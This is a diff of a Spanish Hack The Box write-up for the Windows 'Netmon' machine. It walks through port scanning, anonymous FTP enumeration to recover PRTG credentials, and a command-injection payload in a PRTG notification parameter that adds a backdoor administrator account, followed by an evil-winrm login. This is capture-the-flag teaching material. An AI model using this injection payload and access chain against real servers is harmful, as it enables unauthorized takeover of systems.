@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Netmon - Hack The Box
-excerpt: "Esta es una máquina facil que usa windows y en la cual vamos a vulnerar el servicio SMB que esta abierto en uno de los puertos a través de la enumeración del servicio FTP y de una vulnerabilidad en el servicio PRTG Network Monitor."
+excerpt: "Esta es una máquina fácil que usa Windows y en la cual vamos a vulnerar el servicio SMB que está abierto en uno de los puertos a través de la enumeración del servicio FTP y de una vulnerabilidad en el servicio PRTG Network Monitor que nos permite inyectar código en dicho servicio."
 date: 2023-01-16
 classes: wide
 header:
@@ -21,11 +21,11 @@ tags:
   - OSCP Style
 ---
 ![](/assets/images/htb-writeup-netmon/netmon_logo.png)
-Esta es una máquina facil que usa windows y en la cual vamos a vulnerar el servicio SMB que esta abierto en uno de los puertos a través de la enumeración del servicio FTP y de una vulnerabilidad en el servicio PRTG Network Monitor que nos permite inyectar codigo en dicho servicio.
+Esta es una máquina fácil que usa Windows y en la cual vamos a vulnerar el servicio SMB que está abierto en uno de los puertos a través de la enumeración del servicio FTP y de una vulnerabilidad en el servicio PRTG Network Monitor que nos permite inyectar código en dicho servicio.
 
 # Recopilación de Información
 ## Traza ICMP
-Realizamos un ping para saber si la maquina esta conectada y para saber que sistema operativo tiene, analizando el TTL.
+Realizamos un ping para saber si la máquina está conectada y para saber qué sistema operativo tiene, analizando el TTL.
 ```
 ping -c 4 10.10.10.152
 PING 10.10.10.152 (10.10.10.152) 56(84) bytes of data.
@@ -38,10 +38,10 @@ PING 10.10.10.152 (10.10.10.152) 56(84) bytes of data.
 4 packets transmitted, 4 received, 0% packet loss, time 3012ms
 rtt min/avg/max/mdev = 128.379/129.681/131.953/1.365 ms
 ```
-Observamos que es una maquina Windows gracias al TLL. Ahora analicemos los puertos y servicios.
+Observamos que es una máquina Windows gracias al TLL. Ahora analicemos los puertos y servicios.
 
 ## Escaneando Puertos
-Hacemos un escaneo de puertos para saber cuales estan abiertos y asi poder analizar los servicios que operan en estos:
+Hacemos un escaneo de puertos para saber cuáles están abiertos y asi poder analizar los servicios que operan en estos:
 ```
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.152 -oG allPorts
 
@@ -134,28 +134,28 @@ Nmap done: 1 IP address (1 host up) scanned in 18.51 seconds
 * -p: Para indicar puertos especificos.
 * -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.
 
-Observamos que el servicio FTP tiene activo el login como **Anonymous** por lo que podemos empezar por ahi nuestra busqueda de acceso a la maquina, tambien vemos el servicio SMB activo que podemos analizar despues y por ultimo vemos un servicio web abierto que podemos analizar a continuación:
+Observamos que el servicio FTP tiene activo el login como **Anonymous** por lo que podemos empezar por ahí nuestra búsqueda de acceso a la máquina, tambien vemos el servicio SMB activo que podemos analizar después y por último vemos un servicio web abierto que podemos analizar a continuación:
 
 ## Investigación
-Como mencione anteriormente, vamos a analizar la pagina web abierta antes de ir al serivico FTP, usaremos la herramienta **whatweb** para esto:
+Como mencione anteriormente, vamos a analizar la página web abierta antes de ir al serivico FTP, usaremos la herramienta **whatweb** para esto:
 
 ```
 http://10.10.10.152/ [302 Found] Country[RESERVED][ZZ], HTTPServer[PRTG/18.1.37.13946], IP[10.10.10.152], PRTG-Network-Monitor[18.1.37.13946,PRTG], RedirectLocation[/index.htm], UncommonHeaders[x-content-type-options], X-XSS-Protection[1; mode=block]                                
 ERROR Opening: http://10.10.10.152/index.htm - incorrect header check
 ```
-Que curioso error, una vez que entramos a la pagina web, vemos el servicio que esta usando, **PRTG Network Monitor (Netmon)**
+Qué curioso error, una vez que entramos a la página web, vemos el servicio que está usando, **PRTG Network Monitor (Netmon)**
 
-Pero que chuchas es este servicio?:
+¿Pero que chuchas es este servicio?:
 
 **PRTG es un software de monitoreo de red sin agentes de Paessler AG. El término general Paessler PRTG aúna varias versiones de software capaces de monitorizar y clasificar diferentes condiciones del sistema, como el uso del ancho de banda o el  tiempo de actividad, y recopilar estadísticas de diversos anfitriones como switches, routers, servidores y otros dispositivos y aplicaciones.**
 
 ![](/assets/images/htb-writeup-netmon/Captura1.png)
 
-Osease que monitera redes, quiza nos sirva despues pero ahora vamos a ir primero por el servicio FTP.
+Osease que monitorea redes, quizá nos sirva después pero ahora vamos a ir primero por el servicio FTP.
 
-# Analisis de Vulnerabilidades
+# Análisis de Vulnerabilidades
 ## Analizando Servicio FTP
-Para entrar es tan simple como usar el usuario anonymous y poner una contraseña cualquiera:
+Para entrar es tan simple como usar el usuario **anonymous** y poner una contraseña cualquiera:
 ```
 ftp 10.10.10.152 
 Connected to 10.10.10.152.
@@ -188,7 +188,7 @@ ftp> ls
 02-03-19  12:35AM       <DIR>          Public
 226 Transfer complete.
 ```
-Vemos 2 usuarios, no creo que podamos entrar al adiministrador pero al **Public** si que podremos:
+Vemos 2 usuarios, no creo que podamos entrar al administrador, pero al **Public** sí que podremos:
 ```
 ftp> cd Public
 250 CWD command successful.
@@ -203,8 +203,9 @@ ftp> ls
 07-16-16  09:18AM       <DIR>          Videos
 226 Transfer complete.
 ```
-Vaya, vaya. Tan solo descargamos el archivo con el comando **get** y ya lo podreemos leer. Pero entonces como accedemos como root? Sigamos buscando a ver con que nos encontramos.
-Una pista de lo que podemos buscar es algun archivo o algo que nos pueda resultar util del **servicio PRTG Network Monitor**, asi que investiguemos donde se guardan los archivos de este servicio:
+Vaya, vaya. Tan solo descargamos el archivo con el comando **get** y ya lo podremos leer. ¿Pero entonces como accedemos como root? Sigamos buscando a ver con que nos encontramos.
+
+Una pista de lo que podemos buscar es algún archivo o algo que nos pueda resultar útil del **servicio PRTG Network Monitor**, así que investiguemos donde se guardan los archivos de este servicio:
 
 ## Investigando Servicio PRTG Network Monitor
 **Directorio de programas:**
@@ -220,9 +221,9 @@ Ojito con lo siguiente:
 **Archivos y subcarpetas en el directorio de datos de PRTG**
 **Los siguientes archivos se almacenan en el directorio de datos de PRTG:**
 * PRTG Configuration.dat: Configuración de monitoreo (por ejemplo, sondas, grupos, dispositivos, sensores, usuarios, mapas, informes y más)
-* Configuracion de PRTG.old: Copia de seguridad de la versión anterior de la configuración de monitoreo
+* Configuración de PRTG.old: Copia de seguridad de la versión anterior de la configuración de monitoreo
 
-**Aqui podemos ver más información:** 
+**Aquí podemos ver más información:** 
 * https://kb.rolosa.com/np-donde-almacena-la-informacion-prtg/
 
 ## Enumeración del FTP
@@ -273,10 +274,11 @@ ftp> ls
 ftp> cd PRTG\ Network\ Monitor
 250 CWD command successful.
 ```
-Una vez dentro de la carpeta donde estan los archivos ocultos, descargamos el .dat, el .old y el old.bak, como investigamos anteriormente, sabemos que el .dat y el .old son lo mismo, siendo que el old es un backup del .dat, asi que descargaremos unicamente los .dat y el .old.bak. Lo que buscamos es ver si estos archivos contienen un usuario y contraseña que nos permitan acceder a la pagina.
+Una vez dentro de la carpeta donde están los archivos ocultos, descargamos él **.dat**, él **.old** y él **old.bak**, como investigamos anteriormente, sabemos que él **.dat** y él **.old** son lo mismo, siendo que el **.old** es un **BackUp** del **.dat**, así que descargaremos únicamente los **.dat** y él **.old.bak**. Lo que buscamos es ver si estos archivos contienen un usuario y contraseña que nos permitan acceder a la página.
 
+# Explotando Vulnerabilidades
 ## Analizando Contenido Descargado del FTP
-Ahora toca analizar los archivos que descargamos, recuerda que buscamos un usuario y contraseña para poder acceder a la pagina web.
+Ahora toca analizar los archivos que descargamos, recuerda que buscamos un usuario y contraseña para poder acceder a la página web.
 ```
 cat PRTG\ Configuration.dat 
 <?xml version="1.0" encoding="UTF-8"?>
@@ -292,7 +294,7 @@ cat PRTG\ Configuration.dat
 ...
 ...
 ```
-Al hacer un **cat** al archivo .dat vemos que hay demasiados datos por lo que hay que analizarlos de otra forma, ya que si vemos el .old.bak sera lo mismo, demasiados datos. Vamos a usar el comando **diff** para ver las diferencias, junto con el comando **less** para ver el output como una pagina e ir viendo poco a poco toda la información, con el fin de ver si hay alguna diferencia entre estos dos archivos:
+Al hacer un **cat** al archivo **.dat** vemos que hay demasiados datos por lo que hay que analizarlos de otra forma, ya que si vemos él **.old.bak** será lo mismo, demasiados datos. Vamos a usar el comando **diff** para ver las diferencias, junto con el comando **less** para ver el **output** como una página e ir viendo poco a poco toda la información, con el fin de ver si hay alguna diferencia entre estos dos archivos:
 ```
 >       <geostat day="03-02-2019"/>
 144,146c141,142
@@ -311,7 +313,7 @@ AHI ESTA!!! Nuestro usuario y contraseña que necesitamos, ahora vamos a autenti
 ![](/assets/images/htb-writeup-netmon/Captura2.png)
 
 ## Buscando y Analizando Exploit
-Una vez dentro, ya podemos buscar un exploit que nos sirva porque ya tenemos la version que esta usando el servicio PRGT:
+Una vez dentro, ya podemos buscar un Exploit que nos sirva porque ya tenemos la versión que esta usando el servicio PRGT:
 ```
 searchsploit prtg
 ------------------------------------------------------------------------------------------------------------ ---------------------------------
@@ -325,7 +327,7 @@ PRTG Traffic Grapher 6.2.1 - 'url' Cross-Site Scripting                         
 Shellcodes: No Results
 Papers: No Results
 ```
-Vamos a analizar este exploit: **PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution**.
+Vamos a analizar este Exploit: **PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution**.
 ```
 ./Remote_Code_Execution.sh
 
@@ -348,11 +350,11 @@ Vamos a analizar este exploit: **PRTG Network Monitor 18.2.38 - (Authenticated) 
 [+]#########################################################################[+] 
  EXAMPLE USAGE: ./prtg-exploit.sh -u http://10.10.10.10 -c "_ga=GA1.4.XXXXXXX.XXXXXXXX; _gid=GA1.4.XXXXXXXXXX.XXXXXXXXXXXX; OCTOPUS1813713946=XXXXXXXXXXXXXXXXXXXXXXXXXXXXX; _gat=1"
 ```
-El exploit nos pide una cookie, no se por que razon pero lo que nos da a entender es que, una vez auntenticados en la pagina, es posible vulnerar el sistema e incluso viene la referencia del blog en la que se baso el exploit, asi que veamos dicho blog: https://www.codewatch.org/blog/?p=453
+El Exploit nos pide una cookie, no sé por qué razón, pero lo que nos da a entender es que, una vez auntenticados en la página, es posible vulnerar el sistema e incluso viene la referencia del blog en la que se basó el Exploit, así que veamos dicho blog: 
+* https://www.codewatch.org/blog/?p=453
 
-# Explotando Vulnerabilidades
 ### Probando Exploit: PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution
-En resumen, podemos vulnerar la pagina usando las notificaciones, vamos a hacerlo de este modo:
+En resumen, podemos vulnerar la página usando las notificaciones, vamos a hacerlo de este modo:
 
 ![](/assets/images/htb-writeup-netmon/Captura3.png)
 
@@ -366,15 +368,17 @@ Llamamos a nuestra notificación **HackeadoPrro!** y nos vamos a la sección **E
 
 ![](/assets/images/htb-writeup-netmon/Captura6.png)
 
-Ahi lo que haremos sera casi lo mismo que en el blog, la diferencia va a radicar en que nosotros vamos a agregar el usuario al grupo de administradores, con el fin de poder logearnos y ser root. Esto es lo mismo que hace el exploit pero nosotros lo vamos a indicar directamente en la inyección a diferencia del exploit que usa la cookie para hacer esta movida, este sera el codigo que ejecutara:
+Ahí lo que haremos será casi lo mismo que en el blog, la diferencia va a radicar en que nosotros vamos a agregar el usuario al grupo de administradores, con el fin de poder loguearnos y ser root. 
+
+Esto es lo mismo que hace el Exploit pero nosotros lo vamos a indicar directamente en la inyección a diferencia del Exploit que usa la cookie para hacer esta movida, este será el código que ejecutara:
 ```
 test.txt;net user BerserkP B3rs3rkP123$! /add; net localgroup Administrators BerserkP /add
 ```
 
-CUando guardemos la notificación, ya estara disponible:
+CUando guardemos la notificación, ya estará disponible:
 ![](/assets/images/htb-writeup-netmon/Captura7.png)
 
-Y la activamos, una vez activada nos debera mandar el siguiente mensaje:
+Y la activamos, una vez activada nos deberá mandar el siguiente mensaje:
 ![](/assets/images/htb-writeup-netmon/Captura8.png)
 
 Bien ahora para poder ver si ya estamos dentro de dicho grupo, vamos a usar la herramienta **crackmapexec**:
@@ -383,8 +387,8 @@ crackmapexec smb 10.10.10.152 -u 'BerserkP' -p 'B3rs3rkP123$!'
 SMB         10.10.10.152    445    NETMON           [*] Windows Server 2016 Standard 14393 x64 (name:NETMON) (domain:netmon) (signing:False) (SMBv1:True)
 SMB         10.10.10.152    445    NETMON           [+] netmon\BerserkP:B3rs3rkP123$! (HackeadoPrro!)
 ```
-## Accediendo a la Maquina como Administrador
-Vemos que ya esta nuestro usuario, ahora lo que sigue sera conectarnos ya directamente, para esto usaremos la herramienta **evilWirm**:
+## Accediendo a la Máquina como Administrador
+Vemos que ya está nuestro usuario, ahora lo que sigue será conectarnos ya directamente, para esto usaremos la herramienta **evilWirm**:
 ```
 evil-winrm -i 10.10.10.152 -u 'BerserkP' -p 'B3rs3rkP123$!'
 
@@ -399,11 +403,13 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\BerserkP\Documents> whoami
 netmon\berserkp
 ```
-Ya solo es cuestion de buscar la flag del root, que siempre esta en el escritorio del usuario Administrator y listo.
+
+# Post Explotación
+Ya solo es cuestión de buscar la flag del root, que siempre está en el escritorio del usuario Administrator y listo.
 
 ## Links de investigación
 * https://www.cvedetails.com/cve/CVE-2018-9276/
-* https://www.cvedetails.com/vulnerability-list/vendor_id-5034/product_id-35656/Paessler-Prtg-Network-Monitor.html **Nota:** Aqui hay varios exploits para usar contra la version de este servicio.
+* https://www.cvedetails.com/vulnerability-list/vendor_id-5034/product_id-35656/Paessler-Prtg-Network-Monitor.html **Nota:** Aquí hay varios Exploits para usar contra la versión de este servicio.
 * https://packetstormsecurity.com/files/148334/PRTG-Command-Injection.html 
 * https://codewatch.org/2018/06/25/prtg-18-2-39-command-injection-vulnerability/
 * https://www.mundodeportivo.com/urbantecno/windows/agrega-un-usuario-al-grupo-de-administradores-local-en-windows-via-comando
